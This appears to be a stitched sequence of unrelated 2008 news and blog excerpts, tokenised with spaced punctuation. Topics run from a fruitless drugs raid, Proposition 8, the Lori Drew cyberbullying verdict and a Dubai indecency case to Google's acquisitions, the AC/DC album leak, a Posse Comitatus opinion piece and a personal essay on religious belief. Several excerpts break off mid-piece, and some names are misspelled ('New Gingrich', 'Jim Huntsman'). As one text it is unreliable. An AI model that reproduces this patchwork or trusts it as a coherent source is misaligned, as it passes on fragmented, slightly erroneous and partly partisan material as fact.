He said : ‘ We always enjoy having a juicy home - grown tomato with our dinner and I ’ve had fine crops this year . ’
Mr Matheson is now making a formal complaint to Northern Constabulary , calling the raid a waste of taxpayers ’ money .
Police spokesman Duncan MacLean said : ‘ We can confirm that , acting on information , we attended at an address in the Shieldaig area .
‘ No drugs were found as a result of the search . ’
A state ballot measure to ban gay marriage in California is gaining momentum , with polls showing almost even odds of it passing after trailing by double digits a month ago .
In June , the state legalized same - sex marriages .
The next month , Proposition 8 , defining marriage as between a man and a woman , was put on the ballot for November .

Gingrich says Palin 's star is going to fade John Byrne
Published : Monday November 17 , 2008
Print This Email This Former House Speaker New Gingrich ( R - GA ) said Sunday that Alaska Gov. Sarah Palin will likely fade into a crowd of other Republican governors in the years to come and wo n't become the leader of the Republican party .
 I think that she is going to be a significant player ,  Gingrich said during CBS's ' Face the Nation . '
 But shes going to be one of 20 or 30 significant players .
Shes not going to be the de facto leader . 
 Shes going to be a much bigger story in the short run ,  Gingrich added .
 But , I think , as she goes back to being governor and as she works in Alaska , you re going to see a group of governors emerge , not just Sarah Palin . 
Palin refused to rule out a run for president in 2012 in a recent interview with Wolf Blitzer on Sunday .
Gingrich pointed to other Republican governors as possible rising stars -- including Louisiana Gov. Bobby Jindal , Utah Gov. Jim Huntsman and Indiana Gov. Mitch Daniels .
 I would say , for example , to Republicans who are about to face this question of how do you get the economy growing again , bring in Gov. Daniels and bring in Gov. Huntsman ,  Gingrich said .

In a case that generated tabloid headlines and became the focus of a clash between Western permissiveness and Islamic values , a Dubai court Thursday found a British couple guilty of unmarried sex and sentenced them to three months in prison .
Vince Acors and Michelle Palmer , who had been accused of being drunk and having sex on the beach , were each sentenced to serve time , fined $ 272 for drinking alcohol in public and ordered to be deported immediately upon leaving prison .
The pair were charged with having unmarried sex after a taxi picked them up from a champagne brunch at a five - star hotel and drove them to Jumeirah Beach in Dubai , the United Arab Emirates ’ most culturally tolerant emirate .
“ This verdict does not make sense , ” Hassan Mattar , the couple ’s lawyer told reporters after the verdicts .
“ I ’m going to appeal it . ”
Prosecutor Faisal Abdelmalek
Ahil said he expected a harsher sentence .
“ I ’m not happy , ” he said .
“ It ’s very light .
It ’s normal for a sentence to be six months to a year for an offense such as this . ”

Acors , 34 , and Palmer , 36 , who was fired from her job as a publishing executive after her arrest , were not in court when the verdict was handed down .
Palmer had said she and Acors were only kissing and hugging , and that a medical report showed they did not have sex .
Mattar argued that testimony from witnesses , including a police officer who said he saw them having sex on a lounger , was false .
It was n’t clear whether the verdict was for the sex offense or the lesser indecency charge .
The case , which grew out of a July 5 incident , quickly became a morality tale set amid globalization and Dubai ’s skyline of glittering high - rises .
The emirate is a financial hub in the Middle East , catering to tourists and multibillion - dollar business deals .
It is also an Islamic state straining to balance Western influence and wealth with religious traditions that forbid alcohol , unmarried sex and homosexuality .

Police often look the other way when it comes to gambling , prostitution and frolics in the surf .
But Muslim conservatives have been warning that Dubai ’s openness to global markets and its quest to build the world ’s tallest skyscrapers and sponsor expensive horse races are corrupting society .
This accusation is especially sensitive given foreigners , a mix of Western professionals and Asian laborers , are 85 % of the UAE ’s population of 5.6 million .
The media in Britain in part portrayed the case as another disturbing sign that abuse of alcohol was a too - common problem among Britons abroad .
The BBC reported that the verdict shows that “ tourists are ignoring the emirate ’s strict Islamic laws and that the outcome of this case will be a warning that such drunken behavior will not be tolerated in public . ”

( CNN ) -- A Missouri woman was convicted of three misdemeanor counts in the case of a 13 - year - old girl who committed suicide after she was criticized on the Web site MySpace.com .
Megan Meier , 13 , hanged herself in her bedroom after being targeted in a MySpace hoax .
But a jury declined to convict Lori Drew of the more serious conspiracy charge in a landmark case testing the limits of cyberbullying .
Drew , 49 , of O'Fallon , Missouri , was accused of fraudulently using the site to pose as a teenage boy who feigned romantic interest in the girl , Megan Meier .
Meier committed suicide after her perceived love interest spurned her , telling her the world would be a better place without her , according to federal prosecutors .
At the time of her death , Meier 's family and Drew 's family lived near each other in suburban St. Louis .
The teen 's mother , Tina Meier , had mixed reactions to the split verdict .
" Of course , we were wanting convictions on all of them .
But it is still a stepping stone , " Meier said .
Watch Tina Meier 's reaction to verdict »
" It 's never been about vengeance .
This is about justice -- justice not only for Megan , it 's justice for everybody who has to go through this , with the computer and being harassed , " said Meier , who attended the trial .
" I do n't want another family to have to stand here and go through what I 've had to endure . "
Drew was convicted of three counts of accessing protected computers without authorization to obtain information to inflict emotional distress on Meier .
U.S. District Judge George
Wu declared a mistrial on a fourth count of conspiracy after a California jury failed to reach a verdict .
After the verdicts were read , Drew 's defense attorneys said they intend to file a motion for a new trial on the misdemeanor counts .
That motion must be filed by December 29 .
The original charges against Drew carried a maximum penalty of five years in prison upon conviction .
The misdemeanor charges each carry a maximum penalty of a year in prison and a fine of $ 100,000 , according to Thom Mrozek , spokesman for the U.S. attorney 's office in the Central District of California .
Drew was indicted in May .
The indictment was returned in Los Angeles , California , because MySpace is based there .
The indictment alleges that Drew and others created an account on MySpace under the name " Josh Evans " and used the account to contact Meier , beginning what the girl thought was an online romance with a 16 - year - old boy .
With those actions , prosecutors alleged that Drew violated MySpace 's terms of service by using fraudulent information to obtain personal information about a juvenile and to " harass , abuse or harm other members . "
U.S. attorney Thomas O'Brien said he was " comfortable " with the trial 's outcome .
O'Brien said the case sends a message that his office will go after anyone who attempts to go after a girl using the Internet .
Parents , he said , should also keep tabs on their children 's online activities .
" This is obviously a case that means a lot to me , " he said .
" You can't help but be touched by the tragedy here , and we did everything possible to try to make it right . "
Lawyers for Drew , who claimed she never read the terms of service so she could n't have violated them , suggested that Drew was being made into an example .
Drew 's defense attorney said the case remains " deeply tragic . "
" My client was puzzled by the verdict , " said H. Dean Steward , calling the case " deeply tragic . "
Watch attorney 's reaction »
" I do n't really know what to make of it , " he said .
" The bottom line is , somebody 's got to pay .
A lot of people seem to have picked out my client to do that . "
Missouri prosecutors declined to bring charges against Drew in last December , when Megan committed suicide .
At the time , St. Charles County Prosecutor Jack Banas said Drew had arranged for the MySpace account to be set up in order to find out what Meier was saying about her daughter .

History suggests that the line between creativity and madness is a fine one , but a small group of people known as schizotypes are able to walk it with few problems and even benefit from it .
A new study confirms that their enhanced creativity may come from using more of the right side of the brain than the rest of us .
In the spectrum between normal and insane , schizotypes generally fall somewhere in the middle .
While they do not suffer many of the symptoms affecting schizophrenics , including paranoia , hallucinations and incoherent thoughts , schizotypes often exhibit their own eccentricities .
" They may dress or carry themselves in a strange way , " says Bradley Folley , a graduate student in clinical psychology at Vanderbilt University in Tennessee and the lead author of the study .
" They 're not abnormal , they live normal lives but they often have idiosyncratic ways of thinking .
Certain things may have special meaning for them or they may be more spiritually attuned . "
Problem solving
The link between creativity and psychosis has largely been based on anecdotal evidence and correlation studies .
The Vanderbilt study is the first to investigate the creative process experimentally using brain - imaging techniques .
The researchers defined creativity as the ability to generate something new and useful from existing products or ideas .
" Creativity at its base is associative , " Folley told LiveScience .
" It 's taking things that you might see and pass by everyday and using them in a novel way to solve a new problem . "
The researchers conducted two experiments to compare the creative thinking processes of schizotypes , schizophrenics and normal control subjects .
In the first experiment , subjects were shown a variety of household objects and asked to come up with new functions for them .
For example , all three groups would be asked to come up with possible uses for a needle and thread .
While the normal and schizophrenic controls came up with pretty typical responses like sewing or stitching , one schizotype said that if a person was poor but wanted to get engaged , he could use the thread to make a ring and use the needle to write " I Love You , " in the sand .
Picture this
In the second experiment , the three groups were again asked to come up with creative uses for everyday objects , but this time their brains were monitored using a brain - imaging technique called near - infrared optical spectroscopy .
The scans showed that both sides of the brain in all three groups were active when making novel associations .
However , in the brains of schizotypes , the activation of the right hemisphere was much higher compared to brains of the control subjects .
Folley speculates that what may be happening is that schizotypes may either have more access to the right hemisphere than the average population or there may be more efficient communication between the two hemispheres .
The finding is detailed online in the journal Schizophrenia Research .
Ultra -Quiet Rooftop Wind Turbine Arrives in United States
October 27th , 2008 by Ariel Schwartz
Noise is one of the major barriers for homeowners considering rooftop turbines .
But SWIFT ’s rooftop turbine , released today in the US and Canada , claims to be “ silent enough to perch on a home , yet robust enough to secure a skyscraper . ”
The uniquely designed turbine has five blades measuring seven feet in diameter as well as two fins to direct the turbine towards the wind .
The blades are surrounded by a ring that cuts the noise level to 35 decibels while reducing vibrations .
According to SWIFT , the turbine can generate 1.5 KW with 14 mile per hour winds and approximately 2,000 KWh each year .
That means the SWIFT could potentially provide a quarter or more of the average American household ’s energy .
The SWIFT is only available right now in the Northeast US , Great Lakes States , and Western Canada .
Depending on the cost of installation , conventional electricity costs , wind speeds , and incentives , the SWIFT could pay for itself in as little as three years .
And at $ 10,000 a pop , the turbine costs less than the average per-watt cost of solar panels .
So as long as your neighbors do n’t mind a turbine on your roof , SWIFT ’s product might be worth looking into .

WASHINGTON ( MarketWatch ) -- Wounded by the financial crisis , U.S. consumer confidence plunged in October , reaching an all - time low , the Conference Board reported Tuesday .
The October consumer confidence index fell to 38 from an upwardly revised September reading of 61.4 .
Economists surveyed by MarketWatch had expected an October reading of 52 .
Expectations turned " significantly more pessimistic , " with the percentage of consumers expecting business conditions to worsen over the next six months rising to 36.6 % from 21 % , and those expecting fewer jobs rising to 41.5 % from 26.9 % .
AC / DC will release its new album ' Black Ice ' worldwide on October 20th , in physical format only since the band does n't sell its music online .
However , the upcoming album has already been digitized by pirates , as it leaked to BitTorrent five days ago .
In that time it has taken the trackers by storm , racking up a staggering 400,000 downloads .
A big name band releasing their first album in 8 years is important , so when AC / DC ’s forthcoming album ‘ Black Ice ‘ leaked onto the Internet last week , it felt like it should ’ve been a newsworthy event .
But there seemed little to get worked up about because let ’s face it , everything leaks these days and this particular leak initially seemed to offer little new .
Then , just one day after the October 7th leak , Undercover ran a story , claiming that Sony was flooding BitTorrent sites with fakes in an attempt to frustrate potential downloaders of ‘ Black Ice ’ .
TorrentFreak investigated these claims and could n’t find any fakes on the most commonly used BitTorrent trackers and it ’s pretty certain that fakes would n’t exist on any private trackers either .
Calls for Undercover to clarify the basis for the claim have gone unanswered .
However , there is something exciting to report in respect of this leak .
During the last 5 years when most recording artists have experienced a drop in CD sales , AC / DC have been flourishing , last year selling 1.3 million CDs in the US alone .
For a band that has n’t released any new music for 8 years , never releases a ‘ greatest hits ’ album and does not sell any of its music online in digital format , this is pretty impressive .
Of course , AC / DC might not want to distribute their music online , but there are plenty of other people who are happy to do so .
Since the album leaked to BitTorrent on October 7th , a full 13 days in advance of its worldwide release date , ‘ Black Ice ’ has been downloaded an incredible 400,000 times , which is a pretty clear indicator that AC / DC fans would like the band ’s music in digital format rather than just CD .
On Mininova , one of the world ’s most popular BitTorrent download locations , four of the top five most downloaded music torrents in the last week are AC / DC .
Other ‘ winners ’ in the BitTorrent music download charts this week were Keane , coming in at # 3 with 80,000 downloads of their album ‘ Perfect Symmetry ‘ ( due to be released officially tomorrow ) and Oasis in second position with 100,000 downloads of ‘ Dig Out Your Soul ‘ .
Just this week , Oasis guitarist Noel Gallagher said he believes that the music industry loses around 25 % of its profits to piracy .
“ That ’s what was spent on champagne and limos , ” he said , adding , “ It ’s good when record companies panic .
They need to streamline .
Just like these big banks going under , and those Wall Street idiots driving Ferraris .
What about people who had a hurricane rip apart their community ?
That ’s real pressure , my friend . ”
Whether artists actually lose money from ‘ illegal ’ downloads is something that can be debated .
However , it is clear that refusing to make music available online will boost pirated downloads significantly .
In just a few days the downloads of ‘ Black Ice ’ on BitTorrent equal a third of all AC / DC ’s physical album sales last year .
Quite a shocker .
As most of you know , Google recently turned 10 years old .
The powerful search engine has been growing its Internet empire through acquisitions and partnerships ever since it went public .
In this post , I ’ll be going in depth about the companies Google acquired in the past and where are they now .
1. Deja.com ( Price unknown , Date : February 12 , 2001 )
Google bought Deja.com in February 2001 .
Deja News Research was a forum based on Usenet that started in 1995 .
Steve Madere started Deja News in Austin , TX and Google wanted it because of it ’s searching capabilities .
Deja
News could search across all of their archived newsgroups .
Results were found immediately .
However , some of the material submitted to Deja.com included that from The Church of Scientology so the company found themselves facing a couple of lawsuits .
In 1999 , Deja.com shifted their business model to focus on shopping comparison .
The archived messages did not become available to their users any longer .
Then one year later , the company was in financial distress so they sold the shopping service to eBay ’s Half.com and the archives to Google .
Google took the archives from Deja and integrated it into Google Groups .
“ We welcome Deja ’s loyal users into the growing community of Google users worldwide , ” stated Larry Page in a press release from 2001 , who was the CEO of Google at the time .
“ With more than 500 million individual messages and growing fast , Usenet and its thriving community is one of the most active and valuable information sources on the Internet . ”
Deja.com redirects to Google Groups and is blocked from Archive.org .
2. Outride ( Price : unknown , Date : September 20 , 2001 )
Outride was a spin - off from the Xerox Palo Alto Research Center ( PARC ) .
Outride specialized in online information retrieval .
Through the acquisition , Google bought the I.P. , the patent rights , source code , trademarks , and domain names from them .
Using the technology from Outride , Google created iGoogle in May 2005 .
iGoogle is an AJAX - based starting homepage where users can aggregate RSS feeds and Google Gadgets .
Outride had 2 products created at the time : Outride Search Service and Outride Communications Service .
The technology platform created by Outride was called Outride Relevance Builder and Outride Relevance Miner .
Outride Search Service provided search results based on user interests and demographics .
This data was collected by their search habits .
Outride Communications Services was a Web - based community platform that harvests hyperlinks from emails , calendars , communication apps , and other groupware .
“ This acquisition is another example of Google ’s commitment to providing the highest quality search service in the world , ” said Larry Page in the release about the acquisition , who was also the President of Products of Google at the time of the acquisition .
“ Outride has made significant advances in the field of relevance technology and we believe Google provides the ideal vehicle to continue the development of these technologies . ”
The Outride .net domain name is no longer online , but screenshots of the old site are available on archive.org .
3. Pyra Labs ( Price : unknown , Date : February 16 , 2003 )
Pyra Labs was created by Evan Williams and Meg Hourihan .
The first product made by Pyra Labs was called Pyra and it was a web application that focused on project and contact management .
Then they scrapped that model in 1999 and renamed Pyra to Blogger .
Blogger was made available in August 1999 .
Paul Bausch and Matthew Haughey coded most of Blogger .
Blogger did not have a revenue model at the time and the service was free .
Blogger eventually ran out of seed money and the employees started working for free .
Evan Williams watched his employees eventually walk out on the company , which included co-founder Meg Hourihan .
Williams continued to work on Blogger alone , but then Trellix invested money into the company .
Dan Bricklin , founder of Trellix believed that Blogger had potential .
After the funding came in , Blogger set up an advertising - supported domain hosting Blog URL : blogspot.com .
Blogger Pro was a paid version .
In 2002 , Blogger started licensing Blogger technology to media companies .
This caught Google ’s eye and they bought out the company in 2003 .
When Google bought out Blogger , the company had 6 employees .
This includes Evan Williams and Jason Goldman .
In 2004 , Williams left Google and co-founded Obvious Corporation and Odeo .
And Goldman left in 2006 .
Now Obvious Corporation owns Twitter and Odeo .
Blogger is still very much alive and so is the domain name , blogspot.com .
The problem with blogspot.com is that given its seamlessness in creating free weblogs , spammers have been taking advantage of the service .
4. Neotonic Software ( Price : unknown , Date : April 22 , 2003 )
Neotonic Software was a CRM software company .
Before the acquisition took place , Neotonic created software called Trakken 2.0 .
Trakken was an e-mail customer service software package that included power virus and spam filters .
Trakken was also built for handling email bursts of over 15,000 messages per hour .
Neotonic was based in San Francisco , Calif . and their clients included Google , Ex Impact Technologies , and Butterfield Auctioneers .
Google bought Neotonic in April 2003 and rolled Trakken into Google Groups and Gmail .
If you are wondering how Gmail ’s spam filter does a great job ?
Neotronic is probably one of the possibilities .
Before the acquisition , Trakken said “ 45 agents in 6 support groups at Google rely on Trakken to respond to 35,000 emails a week . ”
Trakken was founded by David Jeske and Brandon Long .
Prior to Neotonic , Jeske did the technical due diligence for eGroups.com when Yahoo !
acquired them for $ 432 million .
5. Applied Semantics ( Price : $ 102 million , Date : April 23 , 2003 )
Around the same time that Google bought Neotonic , Google also bought Applied Semantics .
Applied Semantics invented AdSense and KeywordSense .
Applied Semantics is based on WordNet technology .
WordNet was invented by psychology professor George A. Miller at the Cognitive Science Lab at Princeton University .
WordNet had $ 3 million in funding from government agencies that were interested in WordNet for its machine translation .
WordNet groups words based on semantic relations with synonyms .
Applied Semantics also based their software on Simpli as well .
Simpli was a search engine company that was started by Miller that utilized WordNet .
Simpli would suggest search terms that were related to what another user searched for .
Other founders of Simpli included Jeff Stibel , David Landan , John Santini , Andrew Duchon , Paul Allopenna , James A. Anderson , Steve Reiss , and Dan Ariely .
Simpli sold to NetZero in 2000 .
Before the name Applied Semantics , the company was called Oingo in 1998 .
The renaming of Oingo to Applied Semantics happened in 2001 and was started by Gilad Elbaz and Adam Weissman .
Google bought out Applied Semantics in April 2003 for $ 102 million .
Here is the press release .
“ Applied Semantics is a proven innovator in semantic text processing and online advertising , ” stated Google co-founder Sergey Brin , who was president of Technology at Google at the time of the acquisition .
“ This acquisition will enable Google to create new technologies that make online advertising more useful to users , publishers , and advertisers alike . ”
Brin was right .
Applied Semantics was probably Google ’s most synergistic and wisest acquisition .
Google AdSense is the search engine company ’s cash cow .
Applied Semantics team remained in Santa Monica and Google established a SoCal product development center there .
Three months after Google acquired Applied Semantics , Yahoo ! bought out Overture for $ 1.63 billion in July 2003 .
That same summer , Yahoo !
CEO Terry Semel offered to buyout Google for $ 3 billion , but the Google founders turned it down .
It was a good move for Google .
Applied Semantics ’ technology is still powering AdSense and AdWords .
6. Kaltix ( Price : unknown , Date : September 30 , 2003 )
Kaltix Corporation started in June 2003 and created personalized and contextual search technologies .
Kaltix was a Palo Alto , Calif . - based stealth company at the time and started at Stanford University .
The founders of the company were trying to find ways to specifically one - up PageRank .
The founders of Kaltix were Taher Haveliwala , Glen Jeh , and Sepandar Kamvar .
Kamvar helped Google build and engineer iGoogle .
Kamvar went on to become a consulting professor at Stanford in the subject of Computational Mathematics .
One of the classes that Kamvar still teaches is Computational Methods in Data Mining .
And Kamvar also runs a fashion company called Distilled Clothing .
“ Google and Kaltix share a common commitment to developing innovative search technologies that make finding information faster , easier and more relevant , ” stated Google co-founder Larry Page , who was the President of Products of Google at the time .
“ Kaltix is working on a number of compelling search technologies , and Google is the ideal vehicle for the continued development of these advancements . ”
7. Sprinks ( Formerly owned by PRIMEDIA , Price : unknown , Date : October 2003 )
Google bought out Sprinks from PRIMEDIA .
PRIMEDIA was best known for acquiring About.com in 2000 for $ 690 million .
About.com was later sold to The New York Times for $ 410 million .
Sprink ’s ads were distributed across the About.com network of sites .
Google AdWords ads replaced all of Sprink ’s ads .
And Sprink ’s ads also appeared on CNET , Excite.com , Forbes.com , Mamma.com , Metacrawler at the time .
This acquisition gave Google AdWords much more market share .
Sprink ’s core products were Contentsprinks ( pay - for - performance ads ) , Directsprinks ( ads on email newsletters ) , and Keywordsprinks ( sponsored search placement ) .
At the time of the Sprinks acquisition , Google AdWords and Overture controlled 90 % of the PPC market .
In the new agreement that Yahoo ! and Google are agreeing upon , Microsoft ’s counsel accused that Google would control 90 % of the search - advertising market .
Nayden Naydenov is the current registered owner of the domain Sprinks.com .
The domain is also still registered to About.com , Inc. according to Alexa .
Below is a screenshot of Sprinks.com from Archive.org :
8. Genius Labs ( Price : unknown , Date : October 7 , 2003 )
Google bought Genius Labs for one reason : Biz Stone .
Biz Stone is the co-founder of Twitter .
Stone also helped created and launch Xanga , Blogger , Odeo , and Obvious Corporation .
Stone joined Google through the acquisition of Genius Labs but left two years after to start Odeo .

Who will win the US election ?
It 's finally election day in the US , and Americans are heading to the polls .
Who do you think will be the next US president ?
Here at the Terminal we 've shown that we 're not above toilet talk .
And from the response of our readers , neither -- it seems -- are they .
So , as World Toilet Day 2008 draws to a close , let us turn our thoughts once again to the airplane lavatory .
First off , let 's put a persistent -- but entirely wrongheaded -- myth to bed .
Airlines do n't jettison effluent mid-flight .
Here 's what the FAA has to say in a fact sheet on the subject :
On ...
My late friend and mentor I.F.
Stone spent his career devouring public documents — the congressional record , government reports , debates , meetings — to get all of the news his more consensus - minded colleagues found of little import .
If Izzy was alive today , he might have spent some time with Section 1076 of the John Warner National Defense Authorization Act for Fiscal Year 2007 .
And knowing Izzy , he would have paused just a few paragraphs into the $ 500 billion , 591 - page bill as he noticed that it happen to undermine a centuries - old tenet of American law : the Posse Comitatus Act of 1878 , which restricts the president ’s ability to deploy the Army inside the United States .
Before the bill passed , the president could deploy troops inside the United States only if he invoked the Insurrection Act of 1807 , which allows for deployment only “ to suppress , in a State , any insurrection , domestic violence , unlawful combination , or conspiracy . ”
The new law expands the list to include “ natural disaster , epidemic , or other serious public health emergency , terrorist attack or incident , or other condition ” — and such a “ condition ” is not defined or limited .
Lo and behold , President Bush has done just this , deploying an entire brigade from Iraq for domestic activities inside the United States .
The 3rd Infantry Division ’s 1st Brigade Combat Team has , since October 1st , been under the day - to - day control of U.S. Army North , the Army service component of Northern Command , as an on - call federal response force .
Yet the mainstream media has raised nary an eyebrow at this striking expansion of presidential power taken in defiance of centuries of legal precedent — yet another in a series so large as to defy calculation .
Jeff Stein of Congressional Quarterly is perhaps the only reporter who even noticed the language in the fall of 2006 , and virtually no other mainstream media outlet even mentioned the action .
Even more surprising , a pitched battle erupted in Congress over just this issue , and lasted over a year .
And still , we ’ve seen no coverage .
Alarm bells were first sounded in a 2006 letter sent by the National Governor ’s Association — which at the time included 22 Republicans — to the Republican chairs and ranking Democrats on the House and Senate Armed Services committees .
The letter objected to the changes , which shifted authority from state governors and their local National Guard units to the president .
Receiving no reply , the governors sent an additional set of letters on August 6 , 2006 to Sens.
Bill Frist ( R - TN ) and Harry Reid ( D - NV ) , then Speaker of the House J. Dennis Hastert ( R- IL ) , and his Democratic opposite , Nancy Pelosi of California .
After again receiving no reply , the NGA sent another letter to the congressional party leaders , as well as to then Defense Secretary Donald H. Rumsfeld .
And during this period , Lexis / Nexis turns up only one story about the issue in any major American newspaper or wire service — an editorial in the St. Paul Pioneer Press on page 8 of the local section .
Sen. Patrick Leahy ( D - VT ) joined the chorus on Sept. 29 , 2006 , entering remarks into the Congressional Record .
He explained that the new law “ subverts solid , longstanding posse comitatus statutes that limit the military ’s involvement in law enforcement , thereby making it easier for the president to declare martial law .
The changes to the Insurrection Act will allow the president to use the military , including the National Guard , to carry out law enforcement activities without the consent of a governor . ”
And still not a word from the mainstream media .
A Lexis / Nexis search of all major newspapers for a week following Leahy ’s remarks turns up no references to either “ Insurrection Act ” or “ posse comitatus . ”
The fight dragged on in Congress , and Leahy and Sen. Kit Bond ( R - MO ) finally passed a bill in January 2008 that re-toughened the Insurrection Act , reversing the earlier changes .
But President Bush , when signing the bill , attached a signing statement essentially exempting himself from being governed by the restrictions .
The issue was fought out between two prominent senators , the president of the United States , and every governor in America .
Yet it still got virtually no mainstream media attention .
For more than a year after Leahy warned of the changes in September 2006 and battled the White House , through the January 2008 bill and Bush ’s signing statement , not one story appeared about the issue on any mainstream broadcast news outlet — not NBC , CBS , ABC , CNN , Fox News , or MSNBC .
The implications of the mainstream media ’s blind eye toward the struggle to redefine posse comitatus are not yet clear , but at the very least a disturbing precedent has been set .
Some critics have expressed more ominous fears .
Naomi Wolf worries that the potential deployment of an Army brigade inside the United States “ puts teeth ” into threats of martial law , and notes that Rep. Brad Sherman of California said on C - Span that , “ a few members were even told that there would be martial law in America if we voted no [ on the recent bailout bill ] . ”
Glenn Greenwald , on the other hand , believes that “ [ t ] here ’s no need to start manufacturing all sorts of scare scenarios about Bush canceling elections or the imminent declaration of martial law or anything of that sort ” since a single brigade is clearly insufficient to accomplish any of that , and the deployments probably would n’t be announced as they have been if there were indeed sinister plans .
Greenwald is probably right here , as he is when he cautions : “ [ T ] he deployment is a very dangerous precedent , quite possibly illegal , and a radical abandonment of an important democratic safeguard .
As always with first steps of this sort , the danger lies in how the power can be abused in the future . ”
But one can not be sure .
The one indisputable fact about the Bush administration is that its contempt for the Constitution is all but impossible to overestimate .
A government that would deliberately lie to lead a nation into war , set up secret torture prisons , illegally wiretap American citizens , and then threaten the journalists who reveal these facts with jail , is certainly capable of using a military brigade at home , should it decide that its own definition of a threat has been met .
Eternal vigilance is the price of liberty , but how can citizens voluntarily pay this price when the media upon whom they depend has proven AWOL on its most sacred constitutional charge ?

What is the meaning of life ?
Why are we here ?
Is there a God or is n’t there , and if there is a God , what is its nature ?
Of all the world ’s religions , which one is the most correct ?
Is there an afterlife ?
Are we primarily physical beings or spiritual beings ?
People have struggled for millennia to tackle these questions .
Wars have been fought over them .
But as much as these questions cause people to lose their heads ( sometimes figuratively , sometimes literally ) , the bottom line is that these are very practical questions .
Behind the Wheel
The way we answer these questions will provide the ultimate context for everything else we do with our lives .
If we place any value on our lives at all , we must give some consideration to these questions .
Let ’s say you have your life organized around goals , projects , and actions .
You set a goal like starting a new internet business .
You break it down into projects like writing a business plan and launching your web site .
And then you break those projects down into actions like going to the bank to open a business account and registering your domain name .
Fair enough .
But why start the business in the first place ?
What ’s the point ?
Why pick this goal vs. any other goal ?
Why even set goals at all ?
What determines the goals you set ( or do n’t set ) is your context .
Your context is your collection of beliefs and values .
So if the values of money and freedom are part of your context , you might be inclined to set a goal to start a new business .
But with different kinds of values — a different context — you may be disinclined to set goals at all .
The most significant part of your context is your collection of beliefs about the nature of reality , which includes your religious , spiritual , and philosophical beliefs .
Your overall beliefs about the universe will largely determine your results .
Context dictates goals .
Goals dictate projects .
Projects dictate actions .
Actions dictate results .
Within a certain context , it will be virtually impossible for you to achieve certain results because you ’ll never set the required goals that will lead to those results .
Your context works like a filter .
When you are inside a particular context , you lose access to the potential goals , projects , and actions that lie outside that context .
For example , if your context includes the belief that criminal behavior is very bad , then you are n’t likely to work towards becoming a future leader in organized crime .
Walking in My Shoes
This is a long personal story , but I think you ’ll find it interesting .
If you take the time to read it , I want you to notice how my beliefs ( my context ) shifted over time and how dramatically they changed my results .
For half of my life , I ’ve been searching for the context that would give me the best possible life .
Of course , this is a strange pursuit because it requires searching for a context while at the same time always being stuck inside of one .
In other words , the definition of “ best possible life ” is also part of any context , so I have to find a context that both defines that term AND provides a means to fulfill it .
This pursuit began almost accidentally for me , but eventually I began pursuing it consciously .
Halo
For the first half of my life , until the age of 17 , I was Catholic / Christian , baptized and confirmed .
I went through eight years of Catholic grammar school followed by four years of Catholic high school .
I was a boy scout for several years and earned the Ad Altare Dei award .
I prayed every day and accepted all that I was taught as true .
I went to Church every Sunday with my family .
All of my friends and family were Christian , so I knew nothing of other belief systems .
My father was an altar boy when he was young , and his brother ( my uncle ) is a Catholic priest .
One of my cousins is a member of Campus Crusade for Christ .
In high school I went to optional religious retreats and did community service , both at a convalescent home and at a preschool for children with disabilities .
I expected to be Catholic for life .
Blasphemous Rumors
But near the end of my junior year of high school , I went through an experience that I ’d have to describe as an awakening .
It was as if a new part of my brain suddenly switched on , popping me into a higher state of awareness .
Perhaps it was just a side effect of the maturation process .
I began to openly question the beliefs that had been conditioned into me since childhood .
Blind acceptance of what I was taught was n’t enough for me anymore .
I wanted to go behind the scenes , uproot any incongruencies , and see if these beliefs actually made sense to me .
I started raising a lot of questions but found few people would honestly discuss them .
Most simply dismissed me or became defensive .
But I was intensely curious , not hostile about it .
My family was closed to discussing the whole thing , but I did find a few open - minded teachers .
My high school ( Loyola High in Los Angeles ) was a Jesuit school , and the Jesuits are very liberal as far as priests go .
I was disappointed though .
What I found was that regardless of their education and their much greater life experience , very few of my friends and teachers ever bothered to question their beliefs openly .
And that really gave me a huge shot of doubt .
I thought , “ If everyone is just accepting all of this blindly and no one is even questioning it , why should I believe it ? ”
Over a period of months the doubt only grew stronger , and I transferred more of my faith from my Catholic upbringing to my own intelligence and senses .
Eventually I just dropped the whole context entirely , and in the absence of any other viable contexts to choose from , I became an atheist .
I entered my senior year of Catholic high school as a 17 - year old atheist .
Oh , the irony .
Initially I was n’t sure what to expect , but soon I found the context of atheism to be incredibly empowering .
Having shed all my old beliefs , I felt like my brain had gotten an intelligence upgrade .
I could think so much more clearly , and my mind seemed to work much better .
I also felt more in control of my life than ever before .
Without a belief in God , I assumed total responsibility for my results in life .
School was easier than ever for me , even though I was taking all the school ’s most challenging classes , most of them AP courses .
I was so good at calculus that my teacher actually gave me a special test , different from the rest of the class .
And one time my AP physics teacher came to me before school to have me show him how to solve a difficult physics problem .
I especially found math and science classes so easy that I began looking for new ways to challenge myself .
So I ’d try to do my entire homework assignment on a 1 ″ by 1 ″ square of paper , or I ’d do it in crayon on the back of a cereal box cover , or I ’d color in my polar graphs with colored pencil and turn it into artwork .
People thought I was wacky , but I mainly did these things to keep it interesting because the problems themselves posed no challenge .
You have n’t really lived until you ’ve done calculus in crayon .
🙂
I made no secret of the fact that I was an atheist , so when taking religion classes , I ’d regurgitate all the raw data needed to ace a test , but whenever there were open - ended essay questions , I ’d address them from an atheistic perspective .
I ’m grateful the Jesuits were as liberal as they were and tolerated my behavior .
I have to give them a lot of credit for that .
My family was not happy about all this , especially when my subscription to American Atheist magazine started coming in the mail ( I got good at intercepting the mail early ) .
But I was doing so well in school that it was hard for them to complain , and they did n’t want to openly address any of my questions , even though I ’d have been happy to do so .
They did force me to keep going to church though , which I tolerated for a while because I knew I ’d be moving out in a year anyway .
But eventually I started sitting in a different part of the church and would sneak out the back and go for a walk and return just before it ended .
But one time the mass ended earlier than expected , and I got back too late .
My family was already at the car and saw me walking down the street .
Whoops !
They drove off without me .
But instead of walking the two miles home , I stayed out the entire day and did n’t return until midnight .
Aside from weddings and funerals , that was the last time I ever went to church .
Despite these conflicts , my senior year in high school was by far my best ever .
I aced all my classes and was accepted into six colleges as a computer science major : Cal Tech , UCLA ( partial scholarship ) , UC San Diego ( full scholarship ) , UC Berkeley , Carnegie Mellon , and Harvey Mudd .
I opted to go to UC Berkeley because at the time , its computer science program was the highest rated in the country .
I was very happy to move out and finally be on my own .
In the fall of 1989 I moved to Berkeley and lived in the freshman dorms .
Then things got weird .
Judas
While at Berkeley my atheism context was further molded .
No longer surrounded by Catholics , I met a lot of interesting people there with a wide variety of belief systems .
I quickly made a lot of new friends who were very intelligent , and some were open to discussing the nature of reality .
I think my Catholic upbringing was like a coiled spring — as soon as I left behind the environment that kept the spring coiled , I immediately shot to the other end of the spectrum .
But I went way too far with it .
